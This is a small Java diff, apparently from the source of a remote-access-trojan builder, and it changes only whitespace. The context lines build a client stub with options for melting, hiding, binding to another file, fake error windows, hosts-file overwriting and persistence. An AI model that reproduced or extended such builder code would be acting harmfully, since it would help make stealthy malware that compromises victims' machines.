@@ -258,7 +258,7 @@ public class FrameBuildMinimal extends BaseFrame {
 				osconfig.addOS(OperatingSystem.LINUX);
 
 				Build.build(l, Files.getStub(), file, address, id, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, droptarget, usemutex, mutexport, pluginlist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true);
-				
+
 				Settings.getGlobal().setVal("baddresses", address);
 				Settings.getGlobal().setVal("bid", id);
 				Settings.getGlobal().setVal("bpass", pass);
